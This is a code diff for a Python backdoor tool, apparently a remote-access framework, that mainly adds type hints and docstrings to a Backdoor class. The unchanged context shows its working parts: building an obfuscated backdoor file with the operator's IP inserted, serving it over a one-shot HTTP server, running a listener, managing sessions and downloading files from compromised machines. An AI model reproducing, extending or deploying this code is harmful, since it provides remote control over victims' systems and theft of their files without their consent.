@@ -3,8 +3,8 @@ import time
 import socket
 import argparse
 from core.utils import *
-from core.config import *
-from core.payloads import *
+from core.config import Config
+from core.payloads.payload import fetch
 
 BLOCKSIZE = 65536
 READ_AMOUNT = 50*1024
@@ -62,7 +62,7 @@ class Backdoor:
             payload.stop()
         return result
 
-    def create_backdoor(self):
+    def create_backdoor(self) -> None:
         """ Creates the backdoor file
         """
         if not self.obfuscate_backdoor():
@@ -75,7 +75,7 @@ class Backdoor:
                 self.print_verbose_message(f"Failed to process payload: {self.config.payload}", prefix="-")
                 exit()
 
-    def __just_one_please(self):
+    def __just_one_please(self) -> None:
         """
         Processes One HTTP request then quits
         """
@@ -93,7 +93,7 @@ class Backdoor:
         thread.start()
         print(f"[*] Started HTTP server hosting directory http://{self.config.ip_address}:{self.config.server_port}/ ")
 
-    def start_session(self):
+    def start_session(self) -> None:
         """ Creates the listener
         """
         print(f"[*] Starting Backdoor Listener {self.config.ip_address}:{self.config.port} use CTRL+BREAK to stop")
@@ -119,7 +119,7 @@ class Backdoor:
         backdoor = backdoor.replace("0.0.0.0", self.config.ip_address)
         return save_content_to_file(backdoor, self.config.out_file)
 
-    def handle_client(self, connection):
+    def handle_client(self, connection) -> None:
         """ Handles an active backdoor session
         :param connection: Active backdoor session
         """
@@ -145,10 +145,11 @@ class Backdoor:
         except ConnectionResetError:
             return
 
-    def download_remote_file(self, command , connection):
+    def download_remote_file(self, command , connection) -> bool:
         """ Downloads a remote file from a backdoor session
         :param command: Command to read the file location from
         :param connection: Active backdoor session
+        :return: True if the file was downloaded 
         """
         command = command.split(" ")
         try:
@@ -161,10 +162,11 @@ class Backdoor:
             self.print_verbose_message(f"Saved content {len(data)} to {file_location}")
         return True
 
-    def recvall(self, connection):
+    def recvall(self, connection) -> bytes:
         """ Receives all data in a socket connection
         :param connection: Connection to read data from
         :param data: Previous data parts
+        :return: A byte object containing all the recieved data
         """
         data: bytes = b""
         while True:
@@ -177,17 +179,21 @@ class Backdoor:
                 break
         return data
 
-    def print_verbose_message(self, message: str, prefix: str = "*"):
+    def print_verbose_message(self, message: str, prefix: str = "*") -> None:
         """ Prints a verbose message
         :param message: Message to print
-        :param prefix: Prefix to add before message e.g - == [-] Message
+        :param prefix: Prefix to add before message 
+        
+        e.g:
+        print_verbose_message(message="That didnt work :(", prefix="-")
+        [-] That didnt work :(
         """
         if self.config.verbose:
             if prefix:
                 prefix = f"[{prefix}] "
             print(prefix + message)
 
-    def stop(self):
+    def stop(self) -> None:
         """ Stops the TCP listener and ducky-server if started
         """
         self.sock.close()
